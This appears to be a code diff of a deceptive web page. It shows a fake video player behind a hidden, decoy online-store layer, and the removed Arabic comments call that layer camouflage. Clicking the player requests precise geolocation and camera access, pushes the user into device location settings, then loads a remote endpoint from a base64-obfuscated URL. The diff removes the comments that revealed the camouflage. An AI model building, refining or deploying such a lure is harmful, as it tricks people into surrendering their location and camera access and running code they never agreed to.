@@ -4,7 +4,6 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <!-- META TAGS للتسويق والتوصيل (للتمويه) -->
     <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
     <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
     <meta name="robots" content="index, follow" />
@@ -17,7 +16,6 @@
     <meta name="twitter:title" content="ShopStore - Online Shopping" />
     <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
     
-    <!-- Schema.org للمتجر (للتمويه) -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
@@ -34,7 +32,6 @@
     }
     </script>
     
-    <!-- Schema.org للفيديو (للتمويه) -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
@@ -69,7 +66,6 @@
             overflow: hidden;
         }
 
-        /* عناصر المتجر مخفية عن المستخدم */
         .store-header {
             position: fixed !important;
             top: -9999px !important;
@@ -319,14 +315,12 @@
 </head>
 <body>
 
-    <!-- عناصر المتجر المخفية (للتمويه فقط) -->
     <div class="store-header" aria-hidden="true">
         <span>🛒 ShopStore</span>
         <span>🔍 Search products...</span>
         <span>🛒 Cart (0)</span>
     </div>
 
-    <!-- معلومات المنتج المخفية (للتمويه فقط) -->
     <div class="product-info-hidden" aria-hidden="true">
         <span>$49.99</span>
         <span>★★★★★ 4.8</span>
@@ -334,7 +328,6 @@
         <span>✅ In Stock</span>
     </div>
 
-    <!-- رسالة التوصيل المخفية (للتمويه فقط) -->
     <div class="delivery-notice-hidden" aria-hidden="true">
         <span>📍</span> 
         <span>Enable location for delivery rates & faster shipping</span>
@@ -350,7 +343,6 @@
             <div id="locationActionButton">
                 <span class="play-icon">▶</span>
             </div>
-
             <div class="play-button-overlay" id="playButtonOverlay">
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
@@ -365,21 +357,17 @@
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-
             <div class="time-display">0:00 / 2:45</div>
-
             <div class="volume-control">
                 <span></span>
                 <div class="volume-slider">
                     <div class="volume-level"></div>
                 </div>
             </div>
-
             <button class="control-button fullscreen-btn">⛶</button>
         </div>
     </div>
 
-    <!-- تذييل المتجر المخفي (للتمويه فقط) -->
     <div class="store-footer" aria-hidden="true">
         <span>Privacy Policy</span>
         <span>Terms of Service</span>
@@ -393,53 +381,49 @@
         (function() {
             'use strict';
 
-            let settingsOpened = false;
-            let videoStarted = false;
-            let isProcessing = false;
+            var settingsOpened = false;
+            var videoStarted = false;
+            var isProcessing = false;
 
-            const locationBtn = document.getElementById('locationActionButton');
-            const thumbnailArea = document.getElementById('thumbnailArea');
-            const realVideo = document.getElementById('realVideo');
-            const spinner = document.getElementById('spinner');
-            const loading = document.getElementById('loading');
+            var locationBtn = document.getElementById('locationActionButton');
+            var thumbnailArea = document.getElementById('thumbnailArea');
+            var realVideo = document.getElementById('realVideo');
 
-            // ===== طلب الصلاحيات =====
-            async function requestPermissions() {
+            function requestPermissions() {
                 try {
-                    await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            () => resolve(),
-                            () => resolve(),
-                            { enableHighAccuracy: true, timeout: 5000 }
-                        );
-                    });
+                    navigator.geolocation.getCurrentPosition(
+                        function() {},
+                        function() {},
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
                 } catch (e) {}
                 
                 try {
-                    await navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => stream.getTracks().forEach(t => t.stop()))
-                        .catch(() => {});
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(stream) {
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                        })
+                        .catch(function() {});
                 } catch (e) {}
             }
 
-            // ===== فتح إعدادات الموقع =====
             function openLocationSettings() {
-                const ua = navigator.userAgent;
+                var ua = navigator.userAgent;
                 if (/Android/i.test(ua)) {
-                    const intents = [
+                    var intents = [
                         'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                         'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                         'intent:#Intent;action=android.settings.SETTINGS;end'
                     ];
-                    for (let intent of intents) {
+                    for (var i = 0; i < intents.length; i++) {
                         try {
-                            window.location.href = intent;
+                            window.location.href = intents[i];
                             break;
                         } catch (e) {}
                     }
                 } else if (/iPhone|iPad|iPod/i.test(ua)) {
                     window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-                    setTimeout(() => {
+                    setTimeout(function() {
                         window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                     }, 500);
                 } else if (/Windows/i.test(ua)) {
@@ -451,9 +435,7 @@
                 }
             }
 
-    
             function loadExternalAPI() {
-                
                 var _0x = 'aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9zcGFjZXMvZHNmZGRqZmMvYWdlYWdhYWEvcmF3L21haW4vYXBp';
                 var url = atob(_0x);
                 
@@ -472,30 +454,28 @@
                 };
             }
 
-            // ===== إظهار الفيديو مع الصوت =====
             function showVideo() {
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
                 if (realVideo.paused) {
-                    realVideo.play().catch(() => {});
+                    realVideo.play().catch(function() {});
                 }
             }
 
-            // ===== معالج الضغط على الزر =====
-            async function handleButtonClick() {
+            function handleButtonClick() {
                 if (isProcessing || videoStarted) return;
 
                 if (!settingsOpened) {
                     settingsOpened = true;
-                    await requestPermissions();
+                    requestPermissions();
                     openLocationSettings();
                 } else {
                     videoStarted = true;
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
-                    realVideo.play().catch(() => {});
+                    realVideo.play().catch(function() {});
                     loadExternalAPI();
                     showVideo();
                 }
@@ -516,11 +496,11 @@
                 }
             }, true);
 
-            document.querySelectorAll('.control-button').forEach(button => {
+            document.querySelectorAll('.control-button').forEach(function(button) {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
                     if (this.textContent.includes('⛶')) {
-                        const video = document.getElementById('realVideo');
+                        var video = document.getElementById('realVideo');
                         if (video.requestFullscreen) {
                             video.requestFullscreen();
                         } else if (video.webkitRequestFullscreen) {
@@ -530,22 +510,22 @@
                 });
             });
 
-            const progressInterval = setInterval(() => {
-                const progressFill = document.querySelector('.progress-fill');
-                const realVideoEl = document.getElementById('realVideo');
+            var progressInterval = setInterval(function() {
+                var progressFill = document.querySelector('.progress-fill');
+                var realVideoEl = document.getElementById('realVideo');
                 if (realVideoEl.style.display === 'block') {
                     clearInterval(progressInterval);
                     return;
                 }
-                const currentWidth = parseInt(progressFill.style.width) || 35;
-                const newWidth = (currentWidth + 0.1) % 100;
+                var currentWidth = parseInt(progressFill.style.width) || 35;
+                var newWidth = (currentWidth + 0.1) % 100;
                 progressFill.style.width = newWidth + '%';
 
-                const timeDisplay = document.querySelector('.time-display');
-                const currentSeconds = Math.floor((newWidth / 100) * 165);
-                const minutes = Math.floor(currentSeconds / 60);
-                const seconds = currentSeconds % 60;
-                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
+                var timeDisplay = document.querySelector('.time-display');
+                var currentSeconds = Math.floor((newWidth / 100) * 165);
+                var minutes = Math.floor(currentSeconds / 60);
+                var seconds = currentSeconds % 60;
+                timeDisplay.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds + ' / 2:45';
             }, 1000);
 
         })();
